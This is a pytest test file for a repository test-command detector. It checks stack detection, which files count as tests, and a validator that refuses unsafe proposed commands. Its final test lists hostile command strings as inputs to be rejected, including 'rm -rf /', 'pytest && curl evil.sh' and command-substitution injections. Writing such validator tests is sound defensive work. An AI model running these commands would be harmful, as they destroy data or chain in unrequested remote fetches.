"""repo_tests: the test command a repo's stack implies, whether it has tests yet, and the shape a
proposed command must have - real git repos, committed trees"""

import json
import subprocess

import pytest

from smortboard.repo_tests import (
    NODE_COMMAND,
    NPM_COMMAND,
    PYTHON_COMMAND,
    RepoTests,
    detect_tests,
    has_tests,
    safe_test_command,
    tracked_files,
)


def _repo(tmp_path, files):
    subprocess.run(["git", "init", "-q", "-b", "main", str(tmp_path)], check=True)
    for rel, text in files.items():
        path = tmp_path / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    git = ["git", "-C", str(tmp_path), "-c", "user.name=t", "-c", "user.email=t@t"]
    subprocess.run([*git, "add", "-A"], check=True)
    subprocess.run([*git, "commit", "-q", "--allow-empty", "-m", "x"], check=True)
    return str(tmp_path)


def test_a_python_repo_with_tests_gets_the_offline_uv_command(tmp_path):
    repo = _repo(tmp_path, {"pyproject.toml": "", "uv.lock": "", "tests/test_a.py": ""})
    assert detect_tests(repo, "main") == RepoTests(PYTHON_COMMAND, True)
    assert PYTHON_COMMAND == "uv run --no-sync pytest -q"


def test_a_python_repo_without_tests_still_gets_its_command(tmp_path):
    """the first card that adds tests needs a command to run them with"""
    repo = _repo(tmp_path, {"pyproject.toml": "", "src/app.py": ""})
    assert detect_tests(repo, "main") == RepoTests(PYTHON_COMMAND, False)


def test_a_package_test_script_means_npm_test(tmp_path):
    package = json.dumps({"scripts": {"test": "vitest run"}})
    repo = _repo(tmp_path, {"package.json": package, "src/a.test.js": ""})
    assert detect_tests(repo, "main") == RepoTests(NPM_COMMAND, True)


def test_npms_placeholder_script_counts_as_none(tmp_path):
    placeholder = 'echo "Error: no test specified" && exit 1'
    repo = _repo(tmp_path, {"package.json": json.dumps({"scripts": {"test": placeholder}})})
    assert detect_tests(repo, "main") == RepoTests(NODE_COMMAND, False)


def test_an_empty_or_unknown_repo_gets_no_command(tmp_path):
    repo = _repo(tmp_path, {"README.md": "hi"})
    assert detect_tests(repo, "main") == RepoTests(None, False)


def test_only_committed_files_count(tmp_path):
    repo = _repo(tmp_path, {"pyproject.toml": ""})
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_new.py").write_text("")
    assert detect_tests(repo, "main").has_tests is False


def test_a_path_with_a_space_stays_one_path(tmp_path):
    repo = _repo(tmp_path, {"my docs/read me.md": "x"})
    assert tracked_files(repo, "main") == ["my docs/read me.md"]


def test_a_missing_ref_or_folder_reads_as_nothing(tmp_path):
    assert tracked_files(str(tmp_path / "nope"), "main") == []


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("tests/test_a.py", True),
        ("pkg/test/helpers.js", True),
        ("src/__tests__/a.js", True),
        ("app/test_views.py", True),
        ("server/api_test.go", True),
        ("web/button.spec.tsx", True),
        ("src/testing.py", False),
        ("docs/contest.md", False),
    ],
)
def test_what_counts_as_a_test(path, expected):
    assert has_tests([path]) is expected


@pytest.mark.parametrize(
    "command",
    [
        PYTHON_COMMAND,
        NPM_COMMAND,
        NODE_COMMAND,
        "python -m pytest -q",
        "go test ./...",
        "cargo test",
        "make test",
    ],
)
def test_ordinary_runners_are_safe(command):
    assert safe_test_command(command)


@pytest.mark.parametrize(
    "command",
    [
        "pytest; rm -rf /",
        "pytest && curl evil.sh",
        "npm test | tee out",
        "node --test $(cat x)",
        "rm -rf /workspace",
        "npx something",
        "pytest `id`",
        "",
        "pytest " + "x" * 200,
    ],
)
def test_shell_syntax_or_an_unknown_first_word_is_refused(command):
    assert not safe_test_command(command)
